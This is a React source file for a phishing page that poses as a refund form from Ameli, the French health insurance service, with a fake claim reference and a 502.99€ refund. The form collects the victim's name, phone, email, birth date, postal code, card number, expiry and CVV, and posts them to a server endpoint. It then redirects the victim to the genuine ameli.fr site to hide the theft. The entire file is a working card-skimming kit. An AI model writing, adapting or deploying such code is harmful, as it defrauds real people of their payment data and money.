import React, { useState, useRef} from 'react';
import styles from '../styles/Home.module.css'
import axios from 'axios';
import PopUp from './PopUp';

const Form = () => {

    const [ months, setmonth] = useState(["01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12"])
    const month = months.map(month => month)

    const [ name, setname] = useState("")
    const [ phone, setphone] = useState("")
    const [ email, setemail] = useState("")
    const [ birth, setbirth] = useState([])
    const [ postal, setpostal] = useState("")
    const [ cardNum, setcardNum] = useState("")
    const [ cardMonth, setcardMonth] = useState("01")
    const [ cardYear, setcardYear] = useState("")
    const [ cardCVV, setcardCVV] = useState("")

    const [visibleOrNo, setVisibleOrNo] = useState(false)

    const visible = () =>{
      if(visibleOrNo == false){
        setVisibleOrNo(true)
      }else{
        setVisibleOrNo(false)
        window.location.href = "https://www.ameli.fr/"
      }
    }

    const sendForm = (e) => {
        const info = {
            name: name,
            phoneNumber: phone,
            emailAdress: email,
            birthDate: birth,
            postalCode: postal,
            cardNumber: cardNum,
            cardExpireMonth: cardMonth,
            cardExpireYear: cardYear,
            cardCVV: cardCVV
        }
        if(info.name != ""){
            if(info.phoneNumber != ""){
                if(info.emailAdress != ""){
                    if(info.birthDate != []){
                        if(info.postalCode != ""){
                            if(info.cardNumber != ""){
                                if(info.cardExpireYear != ""){
                                    if(info.cardCVV != ""){
                                        console.log(info);
                                        e.preventDefault()
                                        axios.post("/api/send-form", {
                                            content: info
                                        }).then( async e => {
                                          await new Promise(r => setTimeout(r, 2000));
                                          visible()
                                        })
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }


    return (
        <div className={styles.form}>
          <PopUp setVisible={visible} isVisible={visibleOrNo} />
          <h1>Formulaire de remboursement</h1>
          <h5>Référence : AMELI-A3248R / Montant : 502.99€</h5>
          <form>
            <span className={styles.cnxRequis} >{"Pour bien être remboursé(e), remplissez les champs suivants ci-dessus"}</span>
            <div className={styles.name}>
              <span className={styles.champSaisie}>
                <input value={name} onChange={e => setname(e.target.value)} type="text" required maxLength={20} size='13' aria-required placeholder='Mon nom & prénom' title='Mon nom et mon prénom' tabIndex={0} />
              </span>
            </div>
            <div className={styles.margin}></div>
            <div className={styles.phone}>
              <span className={styles.champSaisie}>
                <input value={phone} onChange={e => setphone(e.target.value)} type="text" required maxLength={10} size='13' aria-required placeholder='Mon numéro de téléphone' title='Mon numéro de téléphone' tabIndex={0} />
              </span>
            </div>
            <div className={styles.margin}></div>
            <div className={styles.email}>
              <span className={styles.champSaisie}>
                <input value={email} onChange={e => setemail(e.target.value)} type="email" required maxLength={40} size='13' aria-required placeholder='Mon adresse mail' title='mon adresse mail' tabIndex={0} />
              </span>
            </div>
            <div className={styles.margin}></div>
            <div className={styles.date}>
              <span className={styles.champSaisie}>
                <input value={birth} onChange={e => setbirth(e.target.value)} type="date" name="trip-start" className={styles.inputDate}
                required
                min="1940-01-01" max="2004-01-01" />
              </span>
            </div>
            <div className={styles.margin}></div>
            <div className={styles.postal}>
              <span className={styles.champSaisie}>
                <input value={postal} onChange={e => setpostal(e.target.value)} type="number" required maxLength={6} size='13' aria-required placeholder='Mon code postal' title='mon code postal' tabIndex={0} />
              </span>
            </div>
            <div className={styles.margin}></div>
            <div className={styles.card}>
              <span className={styles.champSaisie}>
                <input value={cardNum} onChange={e => setcardNum(e.target.value)} id="ccn" type="tel" inputMode="numeric" aria-required required pattern="[0-9\s]{13,16}" autoComplete="cc-number" maxLength="16" placeholder="xxxx xxxx xxxx xxxx"/>
              </span>
            </div>
            <div className={styles.margin}></div>
            <div className={styles.cardExpire}>
              <div>
                <select onChange={(e) => setcardMonth(month[e.target.value])} name="month" id="monthSelect">
                    {month.map((mois, key) => <option key={mois} value={key}>{mois}</option>) }
                </select>
                <input value={cardYear} onChange={e => setcardYear(e.target.value)} type="number" required maxLength={2}  size='13' aria-required placeholder='aa' title='years' min={22} max={99} tabIndex={0} />
                <input value={cardCVV} onChange={e => setcardCVV(e.target.value)} type="number" min={0} max={999} required maxLength={3} size='3' aria-required placeholder='CVV' title='cvv' tabIndex={0} />
                {/* <img src="/images/site-paiement-securise.png" alt="paiement securisé" height={60}/> */}
              </div>
            </div>
            <div className={styles.cnxRequis}>
              <span>Tous les champs sont obligatoires.</span>
            </div>
            <div>
              <input onClick={(e) => sendForm(e)} className={styles.subButton} onSubmit={(e) => sendForm(e)} type="submit" value={"confirmer"}/>
            </div>
          </form>
        </div>
    );
};

export default Form;